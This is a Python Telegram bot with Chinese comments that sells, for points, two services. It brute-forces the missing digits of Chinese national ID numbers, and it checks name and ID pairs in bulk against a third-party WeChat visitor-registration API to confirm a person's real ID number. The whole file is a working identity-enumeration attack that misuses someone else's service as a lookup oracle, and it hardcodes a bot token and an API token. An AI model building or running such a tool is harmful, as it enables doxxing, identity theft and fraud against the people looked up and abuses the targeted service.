import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 1. 核心配置 =================
# 已替换为你提供的新 Token
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
# 默认接口 Token
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {} 

def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

def is_valid_id(n):
    if len(n) != 18: return False
    try:
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        n = n.upper()
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar_len = 16 
    filled = int(bar_len * done // total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    # 去掉反引号，使用默认字体
    return f"⌛ **核验中...**\n[{bar}] {done}/{total} {percent}%"

# --- 核心核验逻辑 ---
def run_batch_task(chat_id, msg_id, name, id_list, uid):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running, stop_signal = None, True, False

    def progress_monitor():
        nonlocal done, is_running
        last_t = 0
        while is_running:
            if time.time() - last_t > 3:
                try:
                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(done, total))
                    last_t = time.time()
                except: pass
            time.sleep(1)

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, stop_signal, success_match
        if stop_signal or not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                # 锁定成功格式
                success_match = f"✨ 发现成功匹配：\n{name} {id_no} 二要素验证成功✅"
                stop_signal, is_running = True, False
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=15) as executor:
        executor.map(verify, id_list)

    is_running = False
    if success_match:
        bot.send_message(chat_id, success_match)
    else:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ 核验完成，未发现匹配结果。")

# ================= 2. 指令逻辑 =================

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    user_states[message.chat.id] = {'step': 'v_name'}
    pts = user_points.get(uid, 0)
    # 找回了完整的欢迎菜单
    menu_text = (
        f"👋 **欢迎使用铭核验机器人**\n\n"
        f"💰 当前积分: `{pts}`\n"
        f"💸 核验费用: `100 积分/次`\n"
        f"🛠 生成费用: `50 积分/次`\n"
        f"👤 管理员: {ADMIN_USERNAME}\n\n"
        f"📢 **当前模式：核验模式**\n"
        f"请输入姓名开始核验，或发送 /gen 进入生成模式。"
    )
    bot.send_message(message.chat.id, menu_text, parse_mode='Markdown')

@bot.message_handler(commands=['gen'])
def gen_cmd(message):
    uid = message.from_user.id
    user_states[message.chat.id] = {'step': 'g_card'}
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"🛠 **进入生成模式**\n💰 积分: {pts}\n请输入补全号 (例如: 370481200905312xxx):")

@bot.message_handler(commands=['add'])
def add_points(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        parts = message.text.split()
        tid, amt = int(parts[1]), int(parts[2])
        user_points[tid] = user_points.get(tid, 0) + amt
        save_points()
        bot.reply_to(message, f"✅ 充值成功！用户 `{tid}` 当前余额: `{user_points[tid]}`")
    except:
        bot.reply_to(message, "格式错误！请使用: `/add 用户ID 积分数量`")

# ================= 3. 核心步骤处理程序 =================

@bot.message_handler(func=lambda m: True)
def handle_all_messages(message):
    uid = message.from_user.id
    chat_id = message.chat.id
    text = message.text.strip()

    # 如果输入的是指令，跳过处理
    if text.startswith('/'): return

    # 检查用户状态
    state = user_states.get(chat_id)
    if not state:
        bot.send_message(chat_id, "❌ 会话已超时或未开始，请发送 /start 重新开始。")
        return

    # --- 核验流程 ---
    if state['step'] == 'v_name':
        user_states[chat_id].update({'step': 'v_ids', 'name': text})
        bot.send_message(chat_id, f"✅ 已记录姓名：`{text}`\n请发送要核验的身份证号码列表：", parse_mode='Markdown')
        
    elif state['step'] == 'v_ids':
        v_ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if is_valid_id(i)]
        if not v_ids:
            bot.send_message(chat_id, "❌ 未发现有效的身份证号，请重新发送。")
            return
        if user_points.get(uid, 0) < 100:
            bot.send_message(chat_id, f"❌ 积分不足！单次核验需要 100 积分，当前剩余: {user_points.get(uid, 0)}")
            return
            
        user_points[uid] -= 100
        save_points()
        msg = bot.send_message(chat_id, get_ui_bar(0, len(v_ids)))
        threading.Thread(target=run_batch_task, args=(chat_id, msg.message_id, state['name'], v_ids, uid)).start()
        del user_states[chat_id]

    # --- 生成流程 ---
    elif state['step'] == 'g_card':
        user_states[chat_id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(chat_id, "请输入性别 (男/女/未知):")

    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50:
            bot.send_message(chat_id, "❌ 积分不足！生成号码需要 50 积分。"); return
        
        bot.send_message(chat_id, "⌛ 正在努力计算补全中...")
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in state['card']]
        if text == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif text == "女": char_sets[16] = ["0", "2", "4", "6", "8"]
        
        ids = [num for res in itertools.product(*char_sets) if is_valid_id(num := "".join(res))][:5000]
        
        if ids:
            user_points[uid] -= 50
            save_points()
            generated_cache[uid] = ids 
            with open("铭.txt", "w") as f: f.write("\n".join(ids))
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(f"🚀 立即核验这 {len(ids)} 个号码 (100积分)", callback_data="start_verify_flow"))
            
            bot.send_document(chat_id, open("铭.txt", "rb"), 
                              caption=f"✅ 生成成功！共计 `{len(ids)}` 个有效号码\n💰 消耗 50 积分，余额 `{user_points[uid]}`", 
                              reply_markup=markup, parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "❌ 补全号格式有误或无法生成有效身份证，请检查。")
        del user_states[chat_id]

    # --- 生成后的专项核验姓名输入 ---
    elif state['step'] == 'v_name_after_gen':
        if uid not in generated_cache:
            bot.send_message(chat_id, "❌ 缓存已丢失，请重新 /gen")
            return
        
        name = text
        user_points[uid] -= 100
        save_points()
        id_list = generated_cache[uid]
        msg = bot.send_message(chat_id, get_ui_bar(0, len(id_list)))
        threading.Thread(target=run_batch_task, args=(chat_id, msg.message_id, name, id_list, uid)).start()
        del user_states[chat_id]

@bot.callback_query_handler(func=lambda call: call.data == "start_verify_flow")
def callback_start_verify(call):
    uid = call.from_user.id
    if uid not in generated_cache:
        bot.answer_callback_query(call.id, "❌ 缓存已失效，请重新生成", show_alert=True)
        return
    if user_points.get(uid, 0) < 100:
        bot.answer_callback_query(call.id, "❌ 积分不足", show_alert=True); return
        
    bot.send_message(call.message.chat.id, "👤 请输入要核验的姓名:")
    user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}
    bot.answer_callback_query(call.id)

if __name__ == '__main__':
    bot.infinity_polling()
